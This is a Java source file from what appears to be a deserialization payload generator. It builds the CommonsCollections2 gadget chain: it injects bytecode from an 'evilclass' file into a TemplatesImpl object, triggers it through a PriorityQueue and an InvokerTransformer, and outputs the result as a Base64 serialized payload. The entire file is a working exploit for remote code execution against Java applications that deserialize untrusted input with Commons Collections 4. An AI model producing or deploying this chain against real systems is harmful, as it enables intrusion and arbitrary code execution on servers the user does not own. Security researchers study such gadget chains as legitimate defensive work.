package org.hasret.webserigen.payloads;
/**
 * 类描述
 *
 * @author Double
 * @version 1.0
 * @since 2025/3/30
 */
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;

import org.hasret.webserigen.annotations.UseCommonsCollections4;

import org.hasret.webserigen.utils.serial;

import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.PriorityQueue;

//cc4改不用数组的invoketransformer
@UseCommonsCollections4
public class CommonsCollections2 {
    public static void main(String[] args) throws IOException, NoSuchFieldException, ClassNotFoundException, InvocationTargetException, NoSuchMethodException, InstantiationException, IllegalAccessException {
        String s = generatePayload("1230");
    }
    public static String generatePayload(final String cmd) throws NoSuchMethodException, ClassNotFoundException, IOException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchFieldException {
        TemplatesImpl templates = new TemplatesImpl();
        Class c = templates.getClass();
        Field names = c.getDeclaredField("_name");
        names.setAccessible(true);
        names.set(templates,"aaaa");
//        Field tfactory = c.getDeclaredField("_tfactory");
//        tfactory.setAccessible(true);
//        tfactory.set(templates, new TransformerFactoryImpl());

        byte[] code = Files.readAllBytes(Paths.get("src/main/java/org/hasret/webserigen/payloads/evilclass/calc.class"));
        byte[][] codes = {code};
        Field bytecodes = c.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        bytecodes.set(templates, codes);


        InvokerTransformer invokerTransformer = new InvokerTransformer<>("newTransformer",new Class[]{},new Object[]{});
        TransformingComparator transformingComparator = new TransformingComparator<>(new ConstantTransformer<>(1));
        PriorityQueue priorityQueue = new PriorityQueue<>(transformingComparator);
        priorityQueue.add(templates);
        priorityQueue.add(2);


        //InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates});

//        Transformer[] transformers = new Transformer[]{
//                new ConstantTransformer(TrAXFilter.class),
//                instantiateTransformer};
//        ChainedTransformer chainedTransformer = new ChainedTransformer<>(transformers);
//        chainedTransformer.transform();
        //cc 4


        Class<?extends TransformingComparator> c2 = transformingComparator.getClass();
        Field transformerfield = c2.getDeclaredField("transformer");
        transformerfield.setAccessible(true);
        transformerfield.set(transformingComparator,invokerTransformer);

         //serial.serialize(priorityQueue);
        //Object unserialize = serial.unserialize("ser.bin");

        return serial.serializeBytesToB64(priorityQueue);
    }
}
